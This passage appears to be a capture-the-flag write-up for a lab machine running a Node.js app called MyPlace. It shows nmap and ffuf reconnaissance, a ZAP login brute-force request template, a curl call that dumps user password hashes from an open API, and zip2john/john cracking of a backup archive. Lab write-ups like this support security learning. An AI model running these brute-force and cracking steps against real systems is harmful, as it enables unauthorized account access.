
#### Nmap

```bash
# Nmap 7.94SVN scan initiated Sat Dec 23 08:39:02 2023 as: nmap -p 22,3000 -sCV -A -T4 -O -oN nmap/port-scan 10.129.36.142
Nmap scan report for 10.129.36.142
Host is up (0.053s latency).

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
| hadoop-datanode-info: 
|_  Logs: /login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|phone|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|5.X (90%), Crestron 2-Series (86%), Google Android 4.X (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/o:google:android:4.0 cpe:/o:linux:linux_kernel:5.0 cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.2 - 4.9 (90%), Linux 3.8 - 3.11 (90%), Linux 4.2 (90%), Linux 4.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   51.62 ms 10.10.14.1
2   51.83 ms 10.129.36.142

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 23 08:39:23 2023 -- 1 IP address (1 host up) scanned in 21.51 seconds
```
```bash
# Nmap 7.94SVN scan initiated Sat Dec 23 09:40:20 2023 as: nmap -p 3000 -sV -Pn -oN nmap/weirdport-scan 10.129.36.142
Nmap scan report for 10.129.36.142
Host is up (0.050s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 23 09:40:32 2023 -- 1 IP address (1 host up) scanned in 12.12 seconds
```

#### Fuzzing

```bash 
# ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.36.142:3000/FUZZ -e php,aspx,jsp,html,js -fs 3861
uploads                 [Status: 301, Size: 173, Words: 7, Lines: 10, Duration: 50ms]
assets                  [Status: 301, Size: 171, Words: 7, Lines: 10, Duration: 82ms]
vendor                  [Status: 301, Size: 171, Words: 7, Lines: 10, Duration: 56ms]
```

#### ZAP login brute force

```bash
# POST Request used to brute force the login form with ZAP
POST http://10.129.36.142:3000/api/session/authenticate HTTP/1.1  
host: 10.129.36.142:3000  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0  
Accept: application/json, text/plain, */*  
Accept-Language: en-US,en;q=0.5  
Content-Type: application/json;charset=utf-8  
content-length: 41  
Origin: https://10.129.36.142:3000  
Connection: keep-alive  
Referer: https://10.129.36.142:3000/login  
Sec-Fetch-Dest: empty  
Sec-Fetch-Mode: cors  
Sec-Fetch-Site: same-origin

{"username":"USER","password":"PASS"}

---
USER: users found (tom, mark, rastating)
PASS: rockyou wordlist (UTF-8 encoded)
```


#### Retrieve users by API

```bash
# curl -s "http://10.129.36.142:3000/api/users" | jq .
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

#### Crack b64-encoded backup file

```bash
# cat myplace.backup | base64 -d > myplace.backup.decode

# mv myplace.backup.decode myplace.backup.zip

# unzip -l myplace.backup.zip 
Archive:  myplace.backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2022-08-16 18:08   var/www/myplace/
    21264  2017-09-02 01:10   var/www/myplace/package-lock.json
        0  2017-09-02 01:10   var/www/myplace/node_modules/
        0  2017-09-02 01:10   var/www/myplace/node_modules/serve-static/
     7508  2017-02-25 03:17   var/www/myplace/node_modules/serve-static/README.md
     4533  2017-02-26 00:11   var/www/myplace/node_modules/serve-static/index.js
	[...SNIP...]
     3861  2017-09-02 13:27   var/www/myplace/app.html
---------                     -------
  6745791                     863 files

# zip2john myplace.backup.zip 2>/dev/null | tee myplace.backup.zip.hash
myplace.backup.zip:$pkzip$8*1*1*0*0*11*2938*58fe7a10900c373022f3333b3ee8f5e7f6*1*0*0*17*996a*e68fa3298c0d596e4c335923622e44b5ab518131527898*1*0*0*19*5083*b1c4af30888f4797af7dee40[...SNIP...]

# john myplace.backup.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=PKZIP
[...SNIP...]
magicword        (myplace.backup.zip)
[...SNIP...]
```